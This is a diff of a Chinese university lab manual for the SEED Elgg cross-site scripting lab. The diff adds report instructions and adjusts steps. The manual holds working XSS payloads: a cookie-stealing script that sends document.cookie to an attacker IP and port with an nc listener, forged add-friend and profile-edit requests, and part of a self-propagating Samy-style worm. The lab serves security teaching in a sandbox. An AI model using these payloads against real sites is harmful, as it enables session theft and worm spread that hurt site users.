@@ -2,7 +2,7 @@
 
 ## 0 环境准备
 
-请从SEED网站下载 [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/) 或者指导书位置下载[Lab3-XSS-Labsetup.zip] (https://gitee.com/hitsz-cslab/net-work-security/tree/master/stupkt) 文件到你的虚拟机，或者QQ群里的实验3压缩文件，解压缩，进入`Labsetup`文件夹，使用`docker-compose.yml`文件来设置实验环境。
+请从SEED网站下载 [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/) 或者指导书位置下载[Lab3-XSS-Labsetup.zip](https://gitee.com/hitsz-cslab/net-work-security/tree/master/stupkt) 文件到你的虚拟机，或者QQ群里的实验3压缩文件，解压缩，进入`Labsetup`文件夹，使用`docker-compose.yml`文件来设置实验环境。
 
 
 **主机名映射**
@@ -69,7 +69,8 @@ $ dockps
 4a101760d086  mysql-10.9.0.6
 ```
 
-这些任务描述了一系列跨站脚本（XSS）攻击的场景，旨在演示如何通过嵌入恶意JavaScript代码来执行不当行为。下面是对这些任务的简要解释和翻译。
+
+## 本次使用通过以下任务完成一系列跨站脚本（XSS）攻击。
 
 ## 任务1：发布恶意消息以显示警告窗口
 
@@ -81,13 +82,24 @@ $ dockps
 
 如果你将上述JavaScript代码嵌入到你的个人资料中（例如在简短描述字段中  Brief description 字段），那么任何查看你个人资料的用户都将看到这个警告窗口。
 
+需要选择一个用户登录（除admin外）， 选择 Edit Profile 菜单，在 Aboutme 或者 Birefdescription 等信息框中嵌入你的告警字段。
+
+<center><img src="../assets/12.png" width = 600></center>
+
+请将下面警告页面 “XSS” 显示 你的学号+Hacker 字样。并截图贴在报告中。
+
+<center><img src="../assets/9.png" width = 600></center>
+
+
 ##  任务2：发布恶意消息以显示Cookies
 
-这个任务的目标是在你的Elgg个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时，用户的 Cookies 将在警告窗口中显示。这可以通过在前面的任务中的 JavaScript 程序添加一些额外的代码来完成，可以将下面的代码替换任务一中的简短描述字段中：
+这个任务的目标是在你的Elgg个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时，用户的 Cookies 将在警告窗口中显示。这可以通过在前面的任务中的 JavaScript 程序添加一些额外的代码来完成，可以将下面的代码替换任务1中的简短描述字段中：
 
 ```
 <script>alert(document.cookie);</script>
 ```
+
+请将查看到的cookie信息截图贴在报告中。
 
 ##  任务3：从受害者的机器上窃取Cookies
 
@@ -95,7 +107,7 @@ $ dockps
 
 在这个任务中，攻击者希望 JavaScript 代码能将 Cookie 发送给他/她自己。为了实现这一点，恶意的 JavaScript 代码需要向攻击者发送一个 HTTP 请求，并在请求中附加 Cookie 。我们可以通过让恶意的 JavaScript 插入一个 <img> 标签，并将其 src 属性设置为攻击者的机器来实现这一点。当 JavaScript 插入 img 标签时，浏览器会尝试从 src 字段中的 URL 加载图像；这将导致向攻击者的机器发送一个 HTTP GET 请求。下面给出的 JavaScript 代码将 Cookie 发送到攻击者机器的5555 端口（假如IP地址为10.9.0.1），攻击者的 TCP 服务器在该端口监听。
 
-脚本如下，需要将下面的 10.9.0.1 换成自己虚拟机的 IP 地址，比如我们实验室的虚拟机 IP 地址可能是 192.168.56.101
+脚本如下，需要将下面的 10.9.0.1 换成自己虚拟机的 IP 地址，端口你可以选择5555也可以选取其他不常用的端口，但是这里填写的端口必须和监听的端口一致，比如我们实验室的虚拟机 IP 地址可能是 192.168.56.101
 
 ```
 <script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>
@@ -110,17 +122,26 @@ $ nc -lknv 5555
 !!! info "提示 :sparkles:"
     -l 选项用于指定nc应该监听传入的连接，而不是启动到远程主机的连接。-nv 选项用于使nc给出更详细的输出。-k 选项意味着当一个连接完成后，继续监听另一个连接。
 
+请将你观察到的信息截图贴到报告中。
+
 ## 任务4：成为受害者的朋友
 
 在这一项和下一项任务中，我们将执行类似于 2005 年 Samy 对 MySpace 进行的攻击（即 Samy 蠕虫病毒）。我们将编写一个跨站脚本（XSS）蠕虫病毒，该病毒会将访问 Samy 页面的任何其他用户添加 Samy 为好友。这种蠕虫病毒不会自我传播；在任务6中，我们将使其具有自我传播能力。
 
 在这项任务中，我们需要编写一个恶意的 JavaScript 程序，该程序能够直接从受害者的浏览器中伪造HTTP请求，而无需攻击者的干预。攻击的目的是将Samy添加为受害者的好友。我们已经在 Elgg 服务器上创建了一个名为 Samy 的用户（用户名为 samy ）。
 
-为了给受害者添加好友，我们首先应该了解合法用户在 Elgg 中如何添加好友。更具体地说，我们需要弄清楚当用户添加好友时，会向服务器发送什么信息。Firefox 的HTTP 检查工具可以帮助我们获取这些信息。它可以显示从浏览器发送的任何HTTP请求消息的内容。从内容中，我们可以识别请求中的所有参数。第5部分提供了如何使用该工具的指南。
+为了给受害者添加好友，我们首先应该了解合法用户在 Elgg 中如何添加好友。更具体地说，我们需要弄清楚当用户添加好友时，会向服务器发送什么信息。Firefox 的HTTP 开发工具可以帮助我们获取这些信息。它可以显示从浏览器发送的任何 HTTP 请求消息的内容。从内容中，我们可以识别请求中的所有参数。下面三幅图显示如何打开这个工具并查看具体消息的参数。
+
+<center><img src="../assets/5.png" width = 600></center>
+
+<center><img src="../assets/7.png" width = 600></center>
+
+<center><img src="../assets/11.png" width = 600></center>
+
 
 一旦我们了解了添加好友的HTTP请求是什么样的，我们就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。我们提供了一个框架 JavaScript 代码，以帮助完成任务。
 
-下面 firend = 56 这个 id 的值要根据实际用户的 id 替换。
+下面 firend = 56 这个 id 的值要根据实际用户的 id 替换，可以参上图中的具体信息，里面有 id 的值。
 
 ```
 <script type="text/javascript">
@@ -141,11 +162,13 @@ window.onload = function () {
 
 上述代码应放置在 Samy 个人资料页面的 “About me” 字段中。此字段提供两种编辑模式：编辑器模式（默认）和文本模式。编辑器模式会在输入到字段中的文本中添加额外的 HTML 代码，而文本模式则不会。由于我们不想在攻击代码中添加任何额外的代码，因此在输入上述JavaScript代码之前，应启用文本模式。这可以通过点击“About me”文本字段右上角的 “HTML editor” 编程 “Visual editor”来完成。
 
+请将samy作为攻击者，至少成为其他两个用户的朋友，并将你观察的结果截图贴到报告中。
+
 ## 任务5：修改受害者的个人资料
 
 本任务的目标是在受害者访问 Samy 的页面时修改其个人资料。具体来说，就是要修改受害者的“About me”字段。我们将编写一个跨站脚本（XSS）蠕虫病毒来完成此任务。这种蠕虫病毒不会自我传播；在任务6中，我们将使其具有自我传播能力。
 
-与之前的任务类似，我们需要编写一个恶意的 JavaScript 程序，该程序能够直接从受害者的浏览器中伪造 HTTP 请求，而无需攻击者的干预。为了修改个人资料，我们首先应该了解合法用户在 Elgg 中如何编辑或修改其个人资料。更具体地说，我们需要弄清楚如何构建 HTTP POST 请求来修改用户的个人资料。我们将使用 Firefox 的HTTP 检查工具。一旦我们了解了修改个人资料的 HTTP POST 请求是什么样的，我们就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。我们提供了一个框架JavaScript 代码，以帮助完成任务。
+与之前的任务类似，我们需要编写一个恶意的 JavaScript 程序，该程序能够直接从受害者的浏览器中伪造 HTTP 请求，而无需攻击者的干预。为了修改个人资料，我们首先应该了解合法用户在 Elgg 中如何编辑或修改其个人资料。更具体地说，我们需要弄清楚如何构建 HTTP POST 请求来修改用户的个人资料。我们将使用 Firefox 的HTTP 开发者工具查看一条修改个人信息的请求信息。一旦我们了解了修改个人资料的 HTTP POST 请求是什么样的，我们就可以编写一个 JavaScript 程序来发送相同的 HTTP 请求。我们已经提供完整的代码，以帮助完成任务，但是你需要找到对应的 id 和将你的学号替换到其中，并仔细阅读代码，思考下 ts 和 token这两个字段的功能。
 
 ```
 <script type="text/javascript">
@@ -173,6 +196,9 @@ window.onload = function () {
 
 与任务4类似，上述代码应放置在 Samy 个人资料页面的“About me”字段中，并且在输入上述 JavaScript 代码之前，应启用文本模式。
 
+请将samy作为攻击者，至少修改其他一个用户的信息，并将你观察的结果截图贴到报告中，在报告中你还需要描述这两个任务中用到的 ts 和 token 这两个字段的功能。
+
+
 ## 任务6：编写自我传播的跨站脚本蠕虫病毒（XSS Worm）
 
 为了成为一个真正的蠕虫病毒，恶意的JavaScript程序应该能够自我传播。也就是说，每当有人查看被感染的个人资料时，不仅他们的个人资料会被修改，蠕虫病毒也会传播到他们的个人资料中，进一步影响查看这些新感染的个人资料的其他人。通过这种方式，查看被感染个人资料的人越多，蠕虫病毒传播的速度就越快。这正是Samy蠕虫病毒所使用的机制：在2005年10月4日发布后的仅仅20小时内，就有超过100万用户受到影响，使Samy成为有史以来传播速度最快的病毒之一。能够实现这一点的JavaScript代码被称为自传播的跨站脚本蠕虫病毒。在这个任务中，你需要实现这样一个蠕虫病毒，它不仅修改受害者的个人资料并添加用户“Samy”为好友，而且将蠕虫病毒本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。
@@ -194,7 +220,7 @@ window.onload = function () {
         var token="&__elgg_token="+elgg.security.token.__elgg_token;
         var content= token + ts + "&name=" + userName + "&description=<p>Hacked by 你的学号 XSS WORM !!!"+ wormCode + "</p> &accesslevel[description]=2" + guid;
         var sendurl = "http://www.seed-server.com/action/profile/edit"
-        var samyGuid=44;
+        var samyGuid=56;
         if(elgg.session.user.guid!=samyGuid){
             var Ajax=null;
             Ajax=new XMLHttpRequest();
@@ -212,6 +238,9 @@ window.onload = function () {
 
 !!! info "提示 :sparkles:"
     当通过HTTP POST请求发送数据，且Content-Type设置为application/x-www-form-urlencoded时（这是我们的代码中所使用的类型），数据也应该进行编码。这种编码方案称为URL编码，它将数据中的非字母数字字符替换为%HH，即一个百分号和两个表示字符ASCII码的十六进制数字。第行中的encodeURIComponent()函数用于对字符串进行URL编码。
+
+
+请将samy作为攻击者，先感染alice再感染boby，观察结果并截图贴到报告中，并思考上述代码的内容为什么能够觉有自我传播功能。
 
 ## 任务7：使用CSP（内容安全策略）抵御XSS攻击
 
